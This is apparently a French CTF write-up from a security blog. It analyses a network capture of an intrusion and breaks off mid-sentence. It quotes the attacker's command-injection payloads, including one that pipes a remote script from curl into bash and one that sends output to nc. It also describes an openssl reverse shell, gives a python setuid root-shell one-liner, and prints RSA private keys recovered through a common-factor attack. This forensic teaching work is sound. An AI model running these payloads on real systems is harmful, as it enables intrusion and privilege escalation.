<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2019] - Revmomon - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2019] - Revmomon"><meta property="og:description" content="Suspicious activity has been detected. Probably nothing to be scared about but take a look anyway. If you find anything, a backdoor, a malware or anything of this kind, flag is the sha256 of it. MD5 of the file : c93adc996da5dda82312e43e9a91d053 PCAP : https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg
Etat des lieux A l&rsquo;ouverture du PCAP, on peut voir énormément de paquets entre l&rsquo;ip 172.17.0.5 et 172.17.0.1. Du premier paquet au 170281, c&rsquo;est une alternance de paquets SYN / RST, caractéristique d&rsquo;un Stealth Scan de nmap."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhacklaus2019revmomon/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-12-22T21:57:40+08:00"><meta property="article:modified_time" content="2019-12-22T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2019] - Revmomon"><meta name=twitter:description content="Suspicious activity has been detected. Probably nothing to be scared about but take a look anyway. If you find anything, a backdoor, a malware or anything of this kind, flag is the sha256 of it. MD5 of the file : c93adc996da5dda82312e43e9a91d053 PCAP : https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg
Etat des lieux A l&rsquo;ouverture du PCAP, on peut voir énormément de paquets entre l&rsquo;ip 172.17.0.5 et 172.17.0.1. Du premier paquet au 170281, c&rsquo;est une alternance de paquets SYN / RST, caractéristique d&rsquo;un Stealth Scan de nmap."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhacklaus2019revmomon/><link rel=prev href=maki.bzh/writeups/wonkachall2019/><link rel=next href=maki.bzh/writeups/santhacklaus2019naughtydockre/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2019] - Revmomon","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhacklaus2019revmomon\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, claranet, forensic, cryptography, network, pcap, malware, rsa","wordcount":1101,"url":"maki.bzh\/writeups\/santhacklaus2019revmomon\/","datePublished":"2019-12-22T21:57:40+08:00","dateModified":"2019-12-22T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2019] - Revmomon</h1><div class=content id=content><blockquote><p>Suspicious activity has been detected. Probably nothing to be scared about but take a look anyway.
If you find anything, a backdoor, a malware or anything of this kind, flag is the sha256 of it.
MD5 of the file : c93adc996da5dda82312e43e9a91d053
PCAP : <a href=https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg target=_blank rel="noopener noreffer">https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg</a></p></blockquote><h3 id=etat-des-lieux>Etat des lieux</h3><p>A l&rsquo;ouverture du PCAP, on peut voir énormément de paquets entre l&rsquo;ip <code>172.17.0.5</code> et <code>172.17.0.1</code>. Du premier paquet au 170281, c&rsquo;est une alternance de paquets SYN / RST, caractéristique d&rsquo;un Stealth Scan de nmap. Il est possible de le voir autrement grâce aux premiers ports scannés :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/WYt7gPe.png data-srcset="https://i.imgur.com/WYt7gPe.png, https://i.imgur.com/WYt7gPe.png 1.5x, https://i.imgur.com/WYt7gPe.png 2x" data-sizes=auto alt=https://i.imgur.com/WYt7gPe.png title=https://i.imgur.com/WYt7gPe.png></p><p>Enfin le user agent &ldquo;Mozilla/5.0 (compatible; Nmap Scripting Engine; <a href=https://nmap.org/book/nse.html%29%22 target=_blank rel="noopener noreffer">https://nmap.org/book/nse.html)"</a> est plutot clair.</p><p>La première hypothèse est de voir que l&rsquo;ip <code>172.17.0.1</code> est l&rsquo;attaquant et <code>172.17.0.5</code> est l&rsquo;attaqué. Il y a un peu de traffic externe, pour ne pas se faire polluer par le reste, un premier filtre est de rigueur :</p><blockquote><p>ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5</p></blockquote><p>Au final la première réelle action utilisateur semble être au stream TCP 85663, car un paramètre POST valide, avec un argument cohérent est passé.</p><h3 id=point-dentré-de-lattaquant>Point d&rsquo;entré de l&rsquo;attaquant</h3><p>Au stream TCP 85664, on peut voir qu&rsquo;une injection de commande a été tentée :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/s77Wuf0.png data-srcset="https://i.imgur.com/s77Wuf0.png, https://i.imgur.com/s77Wuf0.png 1.5x, https://i.imgur.com/s77Wuf0.png 2x" data-sizes=auto alt=https://i.imgur.com/s77Wuf0.png title=https://i.imgur.com/s77Wuf0.png></p><blockquote><p>127.0.0.1; id | nc 172.17.0.1 12345</p></blockquote><p>Et cette injection de commande a l&rsquo;air d&rsquo;avoir fonctionné :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/qhUtVxO.png data-srcset="https://i.imgur.com/qhUtVxO.png, https://i.imgur.com/qhUtVxO.png 1.5x, https://i.imgur.com/qhUtVxO.png 2x" data-sizes=auto alt=https://i.imgur.com/qhUtVxO.png title=https://i.imgur.com/qhUtVxO.png></p><h3 id=exploitation-de-lattaquant>Exploitation de l&rsquo;attaquant</h3><p>L&rsquo;attaquant semble executer un script en mémoire :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/enqXS1Y.png data-srcset="https://i.imgur.com/enqXS1Y.png, https://i.imgur.com/enqXS1Y.png 1.5x, https://i.imgur.com/enqXS1Y.png 2x" data-sizes=auto alt=https://i.imgur.com/enqXS1Y.png title=https://i.imgur.com/enqXS1Y.png></p><blockquote><p>127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash</p></blockquote><p>Bien entendu ce site n&rsquo;est pas accessible il n&rsquo;est pas possible de récupérer le script <strong>a.sh</strong>. Les stream tcp suivant (85667 / 85668) doit être le téléchargement wget via https.
Une différence intéressante réside dans le changement de port entre le stream 85668 (port 443 sur l&rsquo;ip de l&rsquo;attaquant) et le stream 85669 (port 8443 sur l&rsquo;ip de l&rsquo;attaquant).
Vu la tete des paquets TCP, on peut se douter que c&rsquo;est du TLS :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/qf2PUmz.png data-srcset="https://i.imgur.com/qf2PUmz.png, https://i.imgur.com/qf2PUmz.png 1.5x, https://i.imgur.com/qf2PUmz.png 2x" data-sizes=auto alt=https://i.imgur.com/qf2PUmz.png title=https://i.imgur.com/qf2PUmz.png></p><p>Donc un peu de configuration wireshark pour le dissector TLS fasse son travail sur le port 8443, il faut modifier la config du HTTP :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/Akz19kF.png data-srcset="https://i.imgur.com/Akz19kF.png, https://i.imgur.com/Akz19kF.png 1.5x, https://i.imgur.com/Akz19kF.png 2x" data-sizes=auto alt=https://i.imgur.com/Akz19kF.png title=https://i.imgur.com/Akz19kF.png></p><p>Finalement on voit bien un &ldquo;Client Hello&rdquo; sur le port 8443 :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/2Eu7hko.png data-srcset="https://i.imgur.com/2Eu7hko.png, https://i.imgur.com/2Eu7hko.png 1.5x, https://i.imgur.com/2Eu7hko.png 2x" data-sizes=auto alt=https://i.imgur.com/2Eu7hko.png title=https://i.imgur.com/2Eu7hko.png></p><p>Avant de passer à la suite, on a pu déterminer que l&rsquo;exploitation a commencé au stream tcp 85664, soit le paquet 183387. On va appliquer un filtre pour masquer tous les paquets d&rsquo;avant et enregistrer ce nouveau pcap. Ce sera plus simple à manipuler qu&rsquo;un pcap de 35 Mo. Le filtre wireshark :</p><blockquote><p>(frame.number >= 183387) && (ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5)</p></blockquote><p>Et &ldquo;File > Exported Selected Packet&rdquo;</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/Pozr7nJ.png data-srcset="https://i.imgur.com/Pozr7nJ.png, https://i.imgur.com/Pozr7nJ.png 1.5x, https://i.imgur.com/Pozr7nJ.png 2x" data-sizes=auto alt=https://i.imgur.com/Pozr7nJ.png title=https://i.imgur.com/Pozr7nJ.png></p><p>On passe de 185701 paquets à 2077, ce qui est plus confortable.</p><h3 id=crypto-attack>Crypto attack</h3><h4 id=trouver-la-vuln>Trouver la vuln</h4><p>On récupère le &ldquo;Server Hello&rdquo; de la connexion sur le port 443 et 8443. Première chose intéressante, les &ldquo;issuer&rdquo;:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/lCiec87.png data-srcset="https://i.imgur.com/lCiec87.png, https://i.imgur.com/lCiec87.png 1.5x, https://i.imgur.com/lCiec87.png 2x" data-sizes=auto alt=https://i.imgur.com/lCiec87.png title=https://i.imgur.com/lCiec87.png></p><p>Référence à &ldquo;Prime Minister&rdquo; dans les deux. De plus, malgrés les suites de chiffrement safe proposées par le client, le serveur a décidé d&rsquo;utiliser une suite n&rsquo;utilisant pas Diffie Hellman:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/gxDGQP0.png data-srcset="https://i.imgur.com/gxDGQP0.png, https://i.imgur.com/gxDGQP0.png 1.5x, https://i.imgur.com/gxDGQP0.png 2x" data-sizes=auto alt=https://i.imgur.com/gxDGQP0.png title=https://i.imgur.com/gxDGQP0.png></p><p>Référence à prime, pas de diffie hellman -> attaque sur le rsa ?
S&rsquo;il est possible de récupérer une clé privé, alors il sera possible de déchiffrer les communications. S&rsquo;il y avait eu un DH, DHE, ECDH ou ECDHE, alors il aurait fallu connaitre cet aléa échangé. Enfin, un certificat ssl est la composante publique du RSA, donc les attaques classiques de RSA sur clé publiques sont possibles.</p><h4 id=extraction-des-certificats>Extraction des certificats</h4><p>Pour cela, il faut extraire les certificat. CLquer sur le trame &ldquo;Server Hello&rdquo; et selectionner le &ldquo;Certificate&rdquo; dans le paquet:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/Yhwv2IU.png data-srcset="https://i.imgur.com/Yhwv2IU.png, https://i.imgur.com/Yhwv2IU.png 1.5x, https://i.imgur.com/Yhwv2IU.png 2x" data-sizes=auto alt=https://i.imgur.com/Yhwv2IU.png title=https://i.imgur.com/Yhwv2IU.png></p><p>Un CTRL+MAJ+X ou File > Export Packet Bytes et le certificat est extrait. Il faut faire la meme chose pour l&rsquo;autre port.</p><h4 id=conversion-der-to-pem>Conversion DER to PEM</h4><p>Avant de faire une attaque avec RsaCtfTool, qui a l&rsquo;avantage de tester tout un tas d&rsquo;attaque, l faut convertir ces certificat DER au format PEM:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># DER to CRT</span>
</span></span><span class=line><span class=cl>openssl x509 -inform der -in 5_443.der -outform pem -out 5_443.crt
</span></span><span class=line><span class=cl>openssl x509 -inform der -in 5_8443.der -outform pem -out 5_8443.crt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># CRT to PEM</span>
</span></span><span class=line><span class=cl>openssl x509 -pubkey -noout -in 5_443.crt -out 5_443.pem
</span></span><span class=line><span class=cl>openssl x509 -pubkey -noout -in 5_8443.crt -out 5_8443.pem
</span></span></code></pre></td></tr></table></div></div><h4 id=facteur-commun>Facteur commun</h4><p>Pour lancer RsaCtfTool sur plusieurs clés publiques il suffit de:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  writeup git:<span class=o>(</span>master<span class=o>)</span> ✗ /opt/tools/crypto/RsaCtfTool/RsaCtfTool.py --publickey <span class=s2>&#34;*.pem&#34;</span> --private --verbose                                                                                                                             
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Multikey mode using keys: <span class=o>[</span><span class=s1>&#39;5_8443.pem&#39;</span>, <span class=s1>&#39;5_443.pem&#39;</span><span class=o>]</span>                                                                                                                                                                                
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found common factor in modulus <span class=k>for</span> 5_8443.pem and 5_443.pem                                                                                                                                                                          
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEogIBAAKCAQEA8k6sQzkomqCjeOPJ10idYw5K/EJ/crLCWcKZy79hyOiIAHbn
</span></span><span class=line><span class=cl>P3icrfeD8S7qnb6HwMyKvuu1rLkABP8RUVClDlfyMKcZMO8p8kgj+xs82FzMJBeJ
</span></span><span class=line><span class=cl>iEsqSG6t/8zp26/W1oqtGWpderbaO0eZj03ExuyoedbNggfuYCqe7AB9WB8/B7p3
</span></span><span class=line><span class=cl>TEjwnNE7bRc4RBL5KhqzB2plYrrNDqhor5jo/RBgDGdnQGMEo0+A8oZPGzmq4d+l
</span></span><span class=line><span class=cl>E2TxA4FCXKBw2M6C+PdmwkktK1ZF26w/Mk0gEO5DVh0MgPkumEFifTmq9QgpUy8q
</span></span><span class=line><span class=cl>ki/j8yI320MmF6WQer4qtgFpdmFwUQb6KvKnSQIDAQABAoIBAHp/Y38oqmphw8Me
</span></span><span class=line><span class=cl>BbCcuVSWqToWtC/cR3zxcKccvebAB+GUOxxPcYZRl5aazWmqJR9HSO10ZIhJjsT3
</span></span><span class=line><span class=cl>3l1pk8hIldwa3hVrE5208tvDzWLkpx+n9pO8zEeKDNVBVwkFQGt9+DzdFR0wy+sk
</span></span><span class=line><span class=cl>K3HTMyQOCK5v9b1DHTPo2CcfqD6fsXW1cG3VfqlvT+iXyp9Z8hreA78MTEnfSzVW
</span></span><span class=line><span class=cl>g/UMUn1Y/ZjiO7l34JBm2Q0aiHBiRdBIatTDDw9uATrY491Ut/bRCWo9++iC7Kz0
</span></span><span class=line><span class=cl>t5jH28YynQp7upq2ZaLtb3QA/aggEdTN+jWs/EZSmdSY1JN2zUrPkJ81FR3vw+/z
</span></span><span class=line><span class=cl>paUe27ECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
</span></span><span class=line><span class=cl>tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
</span></span><span class=line><span class=cl>T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA/SdK
</span></span><span class=line><span class=cl>0PMQ9UMOtW2PjPwCKF8uymRdh4KgfWufWmrsCTsHYqinKrF9FhxUeSNHN2qPmPnI
</span></span><span class=line><span class=cl>yW0LIvcVAzVA5c9weJgvqOfOigsBQaOcW0FqO8OswtGPyH3//dUIyB/vuZu5LYi4
</span></span><span class=line><span class=cl>93ECyON95PXpubDvgY4GJwM0Lo9vpdaqt/nTWDMCgYBLWUQBidGHjMVa5G0TZBz5
</span></span><span class=line><span class=cl>0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
</span></span><span class=line><span class=cl>CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
</span></span><span class=line><span class=cl>0HXWlptmC+FZO6KCRhGrgwKBgBQETVgkQA0Ell8mIJmnO4xxqkN6mCKk44fHQLxn
</span></span><span class=line><span class=cl>g+5e6oCUkVNA4YEkEFHbxj/Nfzk7VvMGWkEThGfSiCUjt+LxNaOHYL9ti1XjV/On
</span></span><span class=line><span class=cl>Qn0jRb/JzjKuM9WgSKd6TvxAIe5Fx0pZdzznMAcwoqB6KxX1Yusmx7N+x/c2+By/
</span></span><span class=line><span class=cl>9kQdAoGAYxsY9EhchdDsUy5f2DrsQIeCQJueLexVVxebo4rpgb7NCybqqI55qbjd
</span></span><span class=line><span class=cl>2CMdY+8Fw74L2zxwgFDgngrIHsjIMqUNp64pgp+4qqjN+ix0ue86ZTlnaqgK3uaw
</span></span><span class=line><span class=cl>DDlBMgDIvOc+FYcy1aeqpCQHi8R1EIjlqZGvlV8wTwv9dJ+N/ug<span class=o>=</span>
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEowIBAAKCAQEA6qH1D3mce4pI40aDTFHHnU8I84OU7NCR3KD4pTCsktys6cth
</span></span><span class=line><span class=cl>OdZ4YnR6a3SBIEAmpq8p/3KI9fmQO43JJj+N4vWEgsA8S5F3CQZtbKr2ILrCX8BX
</span></span><span class=line><span class=cl>apicvYFHXWl567xWGepkqjdFBAqC8NdpE95ZhZDpwzRgj0DIJRBaKJ9ROdKeo8bY
</span></span><span class=line><span class=cl>atXRCdm/+Q9Cw8rdknZQtnJh8Jc061UWdEaRR5FINQZtNmDkwzehDYD+elZ9zmNX
</span></span><span class=line><span class=cl>oRrB+wYQNuoHTVunBihCFz/WUcoqcItPSoheWGiy+Ok4B0QcBCELhVs5RpSjp6C/
</span></span><span class=line><span class=cl>0yl+0mx3P+1743JsKUmnu1fAYKi3oHAG4sgYFQIDAQABAoIBAGmSVeGQpogvwHwC
</span></span><span class=line><span class=cl>zjEY2ug9F5n6KpgjgH31L+uj6wJpqKPJjwWnKqOiJTMUSMVqF/oH9q2pq1aB5BPn
</span></span><span class=line><span class=cl>yAodrongTq9GL9sQqK625aVvhy9S2QKcWLjt0hiygpnVS7Z2F4exn3m3RKZ81E3p
</span></span><span class=line><span class=cl>nq4B7eXbPlNGzeunCmci5G5CwRlyfsGxNlpFy6pcdytGwCt9+WRS36Yrc8jZQm8x
</span></span><span class=line><span class=cl>qiyA93pTAYBt3Hb0/edpKj6e9dbGIi3YMPpL0TpF63+629uSpP1mW9A2IMVP+I8N
</span></span><span class=line><span class=cl>nBIwxpazruhla/TOOF8nlUTiLtZc5fSnNCgprMXFYmBlB+DCVarS+VD2mqx+ugzm
</span></span><span class=line><span class=cl>DxUtekECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
</span></span><span class=line><span class=cl>tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
</span></span><span class=line><span class=cl>T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA9SKh
</span></span><span class=line><span class=cl>xuY/zb9sl0MbGTB5j4ZKcpNVLh9YCgiRDsXDpUeLNmsOWqJCS0Gep+hSyGEDmbeD
</span></span><span class=line><span class=cl>ijZ02c0GXccpjjYgPltqiREE5j6jUKHLPm8ZuQ+Ia/v6yJGOUMlJZ+14I86+TKtm
</span></span><span class=line><span class=cl>AxCsVZOeHEmV4gSFos3l063n1ywtgmZmkS7m97cCgYBLWUQBidGHjMVa5G0TZBz5
</span></span><span class=line><span class=cl>0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
</span></span><span class=line><span class=cl>CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
</span></span><span class=line><span class=cl>0HXWlptmC+FZO6KCRhGrgwKBgF3QMCuHiJl8Ddnhs6gzNgJoeWtZ2Tp6gl3so18M
</span></span><span class=line><span class=cl>7m/9bliYJfknqclVRpupvKy0/ATDB5NIffWwkiQniU7Ehhh3MdFc8wwOor/D+51c
</span></span><span class=line><span class=cl>NXLub94ro/FISze9oNsmNVk20PtUiQjZQ6rIgLUAsFy8MEx7Ed6t6lEdthj2iYA8
</span></span><span class=line><span class=cl>e+YHAoGBALUVvWU6bh85o86amHzSK8tuHrEXthrzHn6xDwrKNpFFNqL6lepCVKx0
</span></span><span class=line><span class=cl>pH7Ul9V489IRNsOHtKyHewJXyJAsRJrP6c7veE49kjBrIkXHjCf8zhuiqtPdpE1V
</span></span><span class=line><span class=cl>LIXge+kDK5K/FLJN+jtrapJ1DHtuAwsrxD8e4/aB6eGiSsSFMRXU
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>Il y a donc un facteur commun entre les certificats PEM et permet de récupérer les clés privés de chaques flux.</p><h4 id=déchiffrement-du-tls-dans-le-pcap>Déchiffrement du tls dans le pcap</h4><p>Donc maintenant il suffit de déchiffrer le flux TLS avec Wireshark: Clique droit sur un paquet TLS1.2 > Protocole preferences > Open &mldr; > RSA keys list</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/5uEbdV2.png data-srcset="https://i.imgur.com/5uEbdV2.png, https://i.imgur.com/5uEbdV2.png 1.5x, https://i.imgur.com/5uEbdV2.png 2x" data-sizes=auto alt=https://i.imgur.com/5uEbdV2.png title=https://i.imgur.com/5uEbdV2.png></p><p>Ci-dessous la configuration pour déchiffrer les flux:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/jvW76xL.png data-srcset="https://i.imgur.com/jvW76xL.png, https://i.imgur.com/jvW76xL.png 1.5x, https://i.imgur.com/jvW76xL.png 2x" data-sizes=auto alt=https://i.imgur.com/jvW76xL.png title=https://i.imgur.com/jvW76xL.png></p><h3 id=analyse-du-pcap-déchiffré>Analyse du pcap déchiffré</h3><h4 id=flux-sur-le-port-443>Flux sur le port 443</h4><p>Maintenant que les flux sont déchiffrés, regardons le premier flux tcp:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/vDnJxbC.png data-srcset="https://i.imgur.com/vDnJxbC.png, https://i.imgur.com/vDnJxbC.png 1.5x, https://i.imgur.com/vDnJxbC.png 2x" data-sizes=auto alt=https://i.imgur.com/vDnJxbC.png title=https://i.imgur.com/vDnJxbC.png></p><p>Le script bash va télécharger un certificat PEM (/dev/shm/cert2.pem) et faire un reverse shell openssl sur le port 8443: mystère résolue, la transaction sur le port 443 est le serveur web https de l&rsquo;attaquant et celle sur le 8443 est le reverse shell openssl.</p><h4 id=flux-sur-le-port-8443>Flux sur le port 8443</h4><p>L&rsquo;attaquant cherche à élever ses droits, il a drop un LinEnum pour énumérer un maximum de choses:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/jHW9G42.png data-srcset="https://i.imgur.com/jHW9G42.png, https://i.imgur.com/jHW9G42.png 1.5x, https://i.imgur.com/jHW9G42.png 2x" data-sizes=auto alt=https://i.imgur.com/jHW9G42.png title=https://i.imgur.com/jHW9G42.png></p><p>L&rsquo;élevation de privilèges se situe un peu plus bas avec le payload:</p><p><code>/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></p><p>Cette élévation de privilèges s&rsquo;explique par le fait que python a des capabilities particulières:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/KAq2zoc.png data-srcset="https://i.imgur.com/KAq2zoc.png, https://i.imgur.com/KAq2zoc.png 1.5x, https://i.imgur.com/KAq2zoc.png 2x" data-sizes=auto alt=https://i.imgur.com/KAq2zoc.png title=https://i.imgur.com/KAq2zoc.png></p><p>Et c&rsquo;est ce que l&rsquo;attaquant a vu dans son LinEnum. D&rsquo;ailleurs, je crois que l&rsquo;attaquant un message pour le challenger, pour signifier qu&rsquo;un flag est dans le /root:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/SXOEyhi.png data-srcset="https://i.imgur.com/SXOEyhi.png, https://i.imgur.com/SXOEyhi.png 1.5x, https://i.imgur.com/SXOEyhi.png 2x" data-sizes=auto alt=https://i.imgur.com/SXOEyhi.png title=https://i.imgur.com/SXOEyhi.png></p><p>La fin du flux montre le téléchargement 